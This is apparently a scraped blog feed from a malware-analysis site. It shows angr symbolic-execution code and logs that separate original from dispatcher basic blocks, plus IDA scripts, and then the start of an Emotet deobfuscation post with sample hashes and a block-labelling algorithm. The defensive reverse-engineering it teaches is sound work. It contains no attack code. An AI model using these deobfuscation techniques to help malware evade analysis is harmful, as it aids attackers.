&#39;prev_is_obb&#39;:prev_bb_is_obb, &#39;state&#39;:next_bb} else: # Reset it all new_next_bb = project.factory.blank_state(addr=next_address) new_next_bb.options.add(angr.options.CALLLESS) bb_info = {&#39;address&#39;:next_address, &#39;prev_is_obb&#39;:prev_bb_is_obb, &#39;state&#39;:new_next_bb} q.put(bb_info) print(&quot;========================&quot;) print(&quot;DONE!&quot;) . BB: 0x10008784 BB end:0x10008914 Only one successor: 0x10008914 Previous bb was obb this one is too ======================== BB: 0x10008914 BB end:0x10008aa1 Only one successor: 0x10008aa1 Previous bb was obb this one is too ======================== BB: 0x10008aa1 BB end:0x10008c31 Only one successor: 0x10008c31 Previous bb was obb this one is too ======================== BB: 0x10008c31 BB end:0x10008dbb Only one successor: 0x10008dbb Previous bb was obb this one is too ======================== BB: 0x10008dbb BB end:0x10008f47 Only one successor: 0x10008f47 Previous bb was obb this one is too ======================== BB: 0x10008f47 BB end:0x100090d0 Only one successor: 0x100090d0 Previous bb was obb this one is too ======================== BB: 0x100090d0 BB end:0x1000925d Only one successor: 0x1000925d Previous bb was obb this one is too ======================== BB: 0x1000925d BB end:0x100093e6 Only one successor: 0x100093e6 Previous bb was obb this one is too ======================== BB: 0x100093e6 BB end:0x10009555 Multiple successors 0x10009555 0x10009894 Constraints 0x10009555: &lt;Bool reg_esi_105_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_edi_107_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_ebx_108_32{UNINITIALIZED} &lt;=s 0x94ee303&gt; Depends on STATE Constraints 0x10009894: &lt;Bool reg_esi_105_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_edi_107_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_ebx_108_32{UNINITIALIZED} &gt;s 0x94ee303&gt; Depends on STATE Control flow depends on STATE - must be cf ======================== BB: 0x10009555 BB end:0x1000955b Multiple successors 0x10009863 0x1000955b Constraints 0x10009863: &lt;Bool reg_esi_110_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_edi_112_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_ebx_113_32{UNINITIALIZED} &lt;=s 0x94ee303&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} - 0x94ee303 == 0x0&gt; Depends on STATE **Equals STATE next bb must be obb ++ adding obb label Constraints 0x1000955b: &lt;Bool reg_esi_110_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_edi_112_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_ebx_113_32{UNINITIALIZED} &lt;=s 0x94ee303&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} - 0x94ee303 != 0x0&gt; Depends on STATE Control flow depends on STATE - must be cf ======================== BB: 0x10009894 BB end:0x100098a0 Multiple successors 0x100099c1 0x100098a0 Constraints 0x100099c1: &lt;Bool reg_esi_110_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_edi_112_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_ebx_113_32{UNINITIALIZED} &gt;s 0x94ee303&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} == 0x9a37631&gt; Depends on STATE **Equals STATE next bb must be obb ++ adding obb label Constraints 0x100098a0: &lt;Bool reg_esi_110_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_edi_112_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_ebx_113_32{UNINITIALIZED} &gt;s 0x94ee303&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x9a37631&gt; Depends on STATE Control flow depends on STATE - must be cf ======================== BB: 0x10009863 BB end:0x1000988a Already labeled bb - skipping! ======================== BB: 0x1000955b BB end:0x10009563 Multiple successors 0x100097cd 0x10009563 Constraints 0x100097cd: &lt;Bool reg_esi_110_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_edi_112_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_ebx_113_32{UNINITIALIZED} &lt;=s 0x94ee303&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} - 0x94ee303 != 0x0&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} == 0x3db060f&gt; Depends on STATE **Equals STATE next bb must be obb ++ adding obb label Constraints 0x10009563: &lt;Bool reg_esi_110_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_edi_112_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_ebx_113_32{UNINITIALIZED} &lt;=s 0x94ee303&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} - 0x94ee303 != 0x0&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x3db060f&gt; Depends on STATE Control flow depends on STATE - must be cf ======================== BB: 0x100099c1 BB end:0x100099d2 Already labeled bb - skipping! ======================== BB: 0x100098a0 BB end:0x100098a4 Multiple successors 0x100098e8 0x100098a4 Constraints 0x100098e8: &lt;Bool reg_esi_110_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_edi_112_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_ebx_113_32{UNINITIALIZED} &gt;s 0x94ee303&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x9a37631&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} == 0xabd1e15&gt; Depends on STATE **Equals STATE next bb must be obb ++ adding obb label Constraints 0x100098a4: &lt;Bool reg_esi_110_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_edi_112_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_ebx_113_32{UNINITIALIZED} &gt;s 0x94ee303&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x9a37631&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0xabd1e15&gt; Depends on STATE Control flow depends on STATE - must be cf ======================== BB: 0x1000988a BB end:0x10009894 Only one successor: 0x1000953a Previous bb was obb this one is too ======================== BB: 0x100097cd BB end:0x100097e6 Already labeled bb - skipping! ======================== BB: 0x10009563 BB end:0x1000956f Multiple successors 0x10009713 0x1000956f Constraints 0x10009713: &lt;Bool reg_esi_110_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_edi_112_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_ebx_113_32{UNINITIALIZED} &lt;=s 0x94ee303&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} - 0x94ee303 != 0x0&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x3db060f&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} == 0x3fd6f7a&gt; Depends on STATE **Equals STATE next bb must be obb ++ adding obb label Constraints 0x1000956f: &lt;Bool reg_esi_110_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_edi_112_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_ebx_113_32{UNINITIALIZED} &lt;=s 0x94ee303&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} - 0x94ee303 != 0x0&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x3db060f&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x3fd6f7a&gt; Depends on STATE Control flow depends on STATE - must be cf ======================== BB: 0x10009549 BB end:0x10009555 Multiple successors 0x10009555 0x10009894 Constraints 0x10009555: &lt;Bool reg_ebx_124_32{UNINITIALIZED} &lt;=s 0x94ee303&gt; Depends on STATE Constraints 0x10009894: &lt;Bool reg_ebx_124_32{UNINITIALIZED} &gt;s 0x94ee303&gt; Depends on STATE Control flow depends on STATE - must be cf ======================== BB: 0x100098e8 BB end:0x10009904 Already labeled bb - skipping! ======================== BB: 0x100098a4 BB end:0x100098ac Multiple successors 0x100098ac 0x100099c6 Constraints 0x100098ac: &lt;Bool reg_esi_110_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_edi_112_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_ebx_113_32{UNINITIALIZED} &gt;s 0x94ee303&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x9a37631&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0xabd1e15&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} == 0xe571e86&gt; Depends on STATE **Equals STATE next bb must be obb ++ adding obb label Constraints 0x100099c6: &lt;Bool reg_esi_110_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_edi_112_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_ebx_113_32{UNINITIALIZED} &gt;s 0x94ee303&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x9a37631&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0xabd1e15&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0xe571e86&gt; Depends on STATE Control flow depends on STATE - must be cf ======================== BB: 0x1000953a BB end:0x10009555 Multiple successors 0x10009555 0x10009894 Constraints 0x10009555: &lt;Bool reg_ebx_133_32{UNINITIALIZED} &lt;=s 0x94ee303&gt; Depends on STATE Constraints 0x10009894: &lt;Bool reg_ebx_133_32{UNINITIALIZED} &gt;s 0x94ee303&gt; Depends on STATE Control flow depends on STATE - must be cf ======================== BB: 0x100097e6 BB end:0x10009830 Only one successor: 0x10009830 Previous bb was obb this one is too ======================== BB: 0x10009713 BB end:0x10009732 Already labeled bb - skipping! ======================== BB: 0x1000956f BB end:0x10009573 Multiple successors 0x100095a9 0x10009573 Constraints 0x100095a9: &lt;Bool reg_esi_110_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_edi_112_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_ebx_113_32{UNINITIALIZED} &lt;=s 0x94ee303&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} - 0x94ee303 != 0x0&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x3db060f&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x3fd6f7a&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} == 0x8d4442d&gt; Depends on STATE **Equals STATE next bb must be obb ++ adding obb label Constraints 0x10009573: &lt;Bool reg_esi_110_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_edi_112_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_ebx_113_32{UNINITIALIZED} &lt;=s 0x94ee303&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} - 0x94ee303 != 0x0&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x3db060f&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x3fd6f7a&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x8d4442d&gt; Depends on STATE Control flow depends on STATE - must be cf ======================== BB: 0x10009904 BB end:0x1000998c Only one successor: 0x1000998c Previous bb was obb this one is too ======================== BB: 0x100098ac BB end:0x100098d8 Already labeled bb - skipping! ======================== BB: 0x100099c6 BB end:0x100099d2 Multiple successors 0x100099d2 0x10009549 Constraints 0x100099d2: &lt;Bool reg_esi_110_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_edi_112_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_ebx_113_32{UNINITIALIZED} &gt;s 0x94ee303&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x9a37631&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0xabd1e15&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0xe571e86&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} == 0xd886856&gt; Depends on STATE **Equals STATE next bb must be obb ++ adding obb label Constraints 0x10009549: &lt;Bool reg_esi_110_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_edi_112_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_ebx_113_32{UNINITIALIZED} &gt;s 0x94ee303&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x9a37631&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0xabd1e15&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0xe571e86&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0xd886856&gt; Depends on STATE Control flow depends on STATE - must be cf ======================== BB: 0x10009830 BB end:0x1000985b Only one successor: 0x1000985b Previous bb was obb this one is too ======================== BB: 0x10009732 BB end:0x10009750 Only one successor: 0x10009750 Previous bb was obb this one is too ======================== BB: 0x100095a9 BB end:0x100095c2 Already labeled bb - skipping! ======================== BB: 0x10009573 BB end:0x1000957b Multiple successors 0x1000957b 0x100099c6 Constraints 0x1000957b: &lt;Bool reg_esi_110_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_edi_112_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_ebx_113_32{UNINITIALIZED} &lt;=s 0x94ee303&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} - 0x94ee303 != 0x0&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x3db060f&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x3fd6f7a&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x8d4442d&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} == 0x9005e79&gt; Depends on STATE **Equals STATE next bb must be obb ++ adding obb label Constraints 0x100099c6: &lt;Bool reg_esi_110_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_edi_112_32{UNINITIALIZED} != 0x0&gt; &lt;Bool reg_ebx_113_32{UNINITIALIZED} &lt;=s 0x94ee303&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} - 0x94ee303 != 0x0&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x3db060f&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x3fd6f7a&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x8d4442d&gt; Depends on STATE &lt;Bool reg_ebx_113_32{UNINITIALIZED} != 0x9005e79&gt; Depends on STATE Control flow depends on STATE - must be cf ======================== BB: 0x1000998c BB end:0x10009998 Multiple successors 0x10009998 0x1000999f Constraints 0x10009998: &lt;Bool reg_eax_297_32{UNINITIALIZED} == mem_7fff015c_298_32{UNINITIALIZED}&gt; Constraints 0x1000999f: &lt;Bool reg_eax_297_32{UNINITIALIZED} != mem_7fff015c_298_32{UNINITIALIZED}&gt; Control does not depend on STATE - keep previouse state True ======================== BB: 0x100098d8 BB end:0x100098e8 This is an end block ======================== BB: 0x100099d2 BB end:0x100099d7 Already labeled bb - skipping! ======================== BB: 0x1000985b BB end:0x10009863 Only one successor: 0x100096fa Previous bb was obb this one is too ======================== BB: 0x10009750 BB end:0x1000977e Only one successor: 0x1000977e Previous bb was obb this one is too ======================== BB: 0x100095c2 BB end:0x100095e3 Only one successor: 0x100095e3 Previous bb was obb this one is too ======================== BB: 0x1000957b BB end:0x10009595 Already labeled bb - skipping! ======================== BB: 0x10009998 BB end:0x1000999f Only one successor: 0x100099a4 Previous bb was obb this one is too ======================== BB: 0x1000999f BB end:0x100099ba Only one successor: 0x100099ba Previous bb was obb this one is too ======================== BB: 0x100098db BB end:0x100098e8 This is an end block ======================== BB: 0x100096fa BB end:0x10009713 Only one successor: 0x100099c6 Previous bb was obb this one is too ======================== BB: 0x1000977e BB end:0x100097af Only one successor: 0x100097af Previous bb was obb this one is too ======================== BB: 0x100095e3 BB end:0x10009615 Only one successor: 0x10009615 Previous bb was obb this one is too ======================== BB: 0x10009595 BB end:0x100095a9 Only one successor: 0x1000953a Previous bb was obb this one is too ======================== BB: 0x100099a4 BB end:0x100099ba Only one successor: 0x100099ba Previous bb was obb this one is too ======================== BB: 0x100099ba BB end:0x100099c1 Only one successor: 0x100096fa Previous bb was obb this one is too ======================== BB: 0x100097af BB end:0x100097c5 Only one successor: 0x100097c5 Previous bb was obb this one is too ======================== BB: 0x10009615 BB end:0x100096a2 Only one successor: 0x100096a2 Previous bb was obb this one is too ======================== BB: 0x100099ba BB end:0x100099c1 Already labeled bb - skipping! ======================== BB: 0x100097c5 BB end:0x100097cd Only one successor: 0x100096f5 Previous bb was obb this one is too ======================== BB: 0x100096a2 BB end:0x100096d6 Only one successor: 0x100096d6 Previous bb was obb this one is too ======================== BB: 0x100096f5 BB end:0x10009713 Only one successor: 0x100099c6 Previous bb was obb this one is too ======================== BB: 0x100096d6 BB end:0x100096f2 Only one successor: 0x100096f2 Previous bb was obb this one is too ======================== BB: 0x100096f2 BB end:0x10009713 Only one successor: 0x100099c6 Previous bb was obb this one is too ======================== DONE! . # If there is a jmp to the middle of a bb angr doesn&#39;t split it into two bb, this causes issues where a &quot;single&quot; bb # in the view of anger is actually two different types of bb # To normalize these what we need to do is split the bottom parts off the any non-normalized bb and set the type of # the top part of the block to be the same as the previous block # Sort the bb by address bb_states_sorted = {key:bb_states[key] for key in sorted(bb_states.keys())} # For each bb search for bb that end after it and truncate them # Also update their type to match the previous type for bb_address in bb_states_sorted: for ptr in bb_states_sorted: if ptr &gt;= bb_address: # We have passed our bb, not more potential unnormalized bb for this address break if bb_address &lt; bb_states_sorted[ptr].get(&#39;end&#39;): # Truncate the block bb_states_sorted[ptr][&#39;end&#39;] = bb_address # Update block type using previous block for prev_addr in bb_states_sorted: if ptr == bb_states_sorted[prev_addr].get(&#39;end&#39;): bb_states_sorted[ptr][&#39;is_obb&#39;] = bb_states_sorted[prev_addr].get(&#39;is_obb&#39;) break bb_states_sorted . {268470148: {&#39;is_obb&#39;: True, &#39;end&#39;: 268470548}, 268470548: {&#39;is_obb&#39;: True, &#39;end&#39;: 268470945}, 268470945: {&#39;is_obb&#39;: True, &#39;end&#39;: 268471345}, 268471345: {&#39;is_obb&#39;: True, &#39;end&#39;: 268471739}, 268471739: {&#39;is_obb&#39;: True, &#39;end&#39;: 268472135}, 268472135: {&#39;is_obb&#39;: True, &#39;end&#39;: 268472528}, 268472528: {&#39;is_obb&#39;: True, &#39;end&#39;: 268472925}, 268472925: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473318}, 268473318: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473658}, 268473658: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473673}, 268473673: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473685}, 268473685: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473691}, 268473691: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473699}, 268473699: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473711}, 268473711: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473715}, 268473715: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473723}, 268473723: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473749}, 268473749: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473769}, 268473769: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473794}, 268473794: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473827}, 268473827: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473877}, 268473877: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474018}, 268474018: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474070}, 268474070: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474098}, 268474098: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474101}, 268474101: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474106}, 268474106: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474131}, 268474131: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474162}, 268474162: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474192}, 268474192: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474238}, 268474238: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474287}, 268474287: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474309}, 268474309: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474317}, 268474317: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474342}, 268474342: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474416}, 268474416: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474459}, 268474459: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474467}, 268474467: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474506}, 268474506: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474516}, 268474516: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474528}, 268474528: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474532}, 268474532: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474540}, 268474540: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474584}, 268474584: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474587}, 268474587: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474600}, 268474600: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474628}, 268474628: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474764}, 268474764: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474776}, 268474776: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474783}, 268474783: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474788}, 268474788: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474810}, 268474810: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474817}, 268474817: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474822}, 268474822: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474834}, 268474834: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474839}} . Label The IDA Basic Blocks . import idaapi import idautils import idc from queue import Queue import struct bb_states = {268470148: {&#39;is_obb&#39;: True, &#39;end&#39;: 268470548}, 268470548: {&#39;is_obb&#39;: True, &#39;end&#39;: 268470945}, 268470945: {&#39;is_obb&#39;: True, &#39;end&#39;: 268471345}, 268471345: {&#39;is_obb&#39;: True, &#39;end&#39;: 268471739}, 268471739: {&#39;is_obb&#39;: True, &#39;end&#39;: 268472135}, 268472135: {&#39;is_obb&#39;: True, &#39;end&#39;: 268472528}, 268472528: {&#39;is_obb&#39;: True, &#39;end&#39;: 268472925}, 268472925: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473318}, 268473318: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473658}, 268473658: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473673}, 268473673: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473685}, 268473685: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473691}, 268473691: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473699}, 268473699: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473711}, 268473711: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473715}, 268473715: {&#39;is_obb&#39;: False, &#39;end&#39;: 268473723}, 268473723: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473749}, 268473749: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473769}, 268473769: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473794}, 268473794: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473827}, 268473827: {&#39;is_obb&#39;: True, &#39;end&#39;: 268473877}, 268473877: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474018}, 268474018: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474070}, 268474070: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474098}, 268474098: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474101}, 268474101: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474106}, 268474106: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474131}, 268474131: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474162}, 268474162: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474192}, 268474192: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474238}, 268474238: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474287}, 268474287: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474309}, 268474309: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474317}, 268474317: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474342}, 268474342: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474416}, 268474416: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474459}, 268474459: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474467}, 268474467: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474506}, 268474506: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474516}, 268474516: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474528}, 268474528: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474532}, 268474532: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474540}, 268474540: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474584}, 268474584: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474587}, 268474587: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474600}, 268474600: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474628}, 268474628: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474764}, 268474764: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474776}, 268474776: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474783}, 268474783: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474788}, 268474788: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474810}, 268474810: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474817}, 268474817: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474822}, 268474822: {&#39;is_obb&#39;: False, &#39;end&#39;: 268474834}, 268474834: {&#39;is_obb&#39;: True, &#39;end&#39;: 268474839}} def set_bb_color(ea_start, ea_end, color_value): ea_end = prev_head(ea_end) ptr = ea_start while ptr &lt;= ea_end : set_color(ptr, CIC_ITEM, color_value) ptr = next_head(ptr) for b in bb_states: print(f&quot;{hex(b)} - {hex(bb_states[b].get(&#39;end&#39;))}: {bb_states[b].get(&#39;is_obb&#39;)}&quot;) if bb_states[b].get(&#39;is_obb&#39;): set_bb_color(b, bb_states[b].get(&#39;end&#39;), 0x00ff00) else: set_bb_color(b, bb_states[b].get(&#39;end&#39;), 0x00A5ff) .",
            "url": "https://research.openanalysis.net/angr/symbolic%20execution/deobfuscation/research/2022/04/13/symbolic_execution_basics.html",
            "relUrl": "/angr/symbolic%20execution/deobfuscation/research/2022/04/13/symbolic_execution_basics.html",
            "date": " • Apr 13, 2022"
        }
        
    
  
    
        ,"post14": {
            "title": "Emotet Deobfuscation",
            "content": "Overview . Sample: c7574aac7583a5bdc446f813b8e347a768a9f4af858404371eae82ad2d136a01 . Unpacked: eeb13cd51faa7c23d9a40241d03beb239626fbf3efe1dbbfa3994fc10dea0827 . References: . Malshare Sample (Unpacked) | . Research: . DFS and BFS graph traversal tutorial | OST2 - Reverse Engineering 3201: Symbolic Analysis | . Approach For Identifying Original Basic Blocks (OBB) - Assembly/IDA Only . Shout out to @mrexodia full credit goes to him for this approach! . . We are doing a breadth-first search through bb. This is specific to the binary we are analyzing, we just noticed that the jz/jnz is used for dispatcher control flow (it will differ for other binaries). For our search algorithm we will relie on this to mark a transition from the cf to an obb. . The generic algorithm. . Assume two states (not the same as the cff states) in obb and in cf. | Walk the graph in a bredth first search (BFS) and track your current state. When you are in cf you can transition to in obb on the positive branch of a jz or the negative branch of a jnz. | If you are in obb you don&#39;t exit until you hit an already identified in obb bb. | . | Mark each bb as you go | . This works because we are doing a BFS and the CFF forces a loop back to the dispatcher so we are garunteed to have already seen the dispatcher in cf bb before we reach the end of the first in obb. . The specific algorithm. . start at the disptacher entry this is the first dispatcher block | for each next bb if it doesn&#39;t end in a jz/jnz then we mark as dispatcher and search forward | if we are in a dispatcher and end with a jz the TRUE points to a obb and the FALSE points to another dispatcher | if we are in a dispatcher and end with a jnz the FALSE points to a obb and the TRUE points to another dispatcher | mark the blocks and continue our search BFS | if we are in an obb mark every next bb as an obb until we see a dispatcher block (then end that trace) | . import idaapi import idautils import idc from queue import Queue import struct # Basic blocks for dispatcher and obb # bb_states[start_address] = obb = True/False (obb or dispatcher) bb_states = {} bb_visited = set() fn_start = 0x10008784 fn_end = 0x100099D2 dispatcher_start = 0x1000953A function = idaapi.get_func(fn_start) flowchart = idaapi.FlowChart(function) # Get bb flowchart starting with dispatcher dispatcher_flowchart = list(flowchart[0].succs())[0] # Use a queue for BFS q = Queue() # Push dispatcher start onto queue and add info q.put(dispatcher_flowchart) bb_states[dispatcher_flowchart.start_ea] = {&#39;obb&#39;:False } # Walk through bb while not q.empty(): bb_flowchart = q.get() bb_start = bb_flowchart.start_ea # Get bb_info bb_info = bb_states[bb_start] #print(f&quot;-&gt; {hex(bb_start)} {bb_info}&quot;) if bb_start in bb_visited: # We don&#39;t need to re-process this just continue continue else: bb_visited.add(bb_start) # Check if there are successors if len(list(bb_flowchart.succs())) == 0: continue # Check if the bb is conditional if len(list(bb_flowchart.succs())) &gt; 1: # Parse the condition bb_end = prev_head(bb_flowchart.end_ea) if not bb_info.get(&#39;obb&#39;) and print_insn_mnem(bb_end) == &#39;jz&#39;: # The true jmp 